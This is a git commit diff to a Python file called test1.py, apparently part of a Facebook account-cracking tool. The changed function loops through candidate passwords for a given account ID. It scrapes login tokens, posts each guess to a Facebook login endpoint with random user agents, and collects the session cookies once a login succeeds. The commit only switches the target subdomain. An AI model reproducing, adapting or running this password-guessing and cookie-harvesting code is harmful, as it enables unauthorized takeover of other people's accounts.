e82bfd9ae65861d1e22f7e5c45a6a8e7beb50233
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-07-06 17:45:38 +0530

    Update test1.py

--- test1.py
+++ test1.py
@@ -1146,7 +1146,7 @@ def m1(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    ua = random.choice(ugenx)
-   free_fb = session.get('https://mtuoch.facebook.com').text
+   free_fb = session.get('https://p.facebook.com').text
    log_data ={
     "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1157,7 +1157,7 @@ def m1(idf,pwv):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
-   header_freefb =  {'authority':'mtuoch.facebook.com',
+   header_freefb =  {'authority':'p.facebook.com',
    'method': 'POST',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -1173,7 +1173,7 @@ def m1(idf,pwv):
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://mtuoch.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   lo = session.post('https://p.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
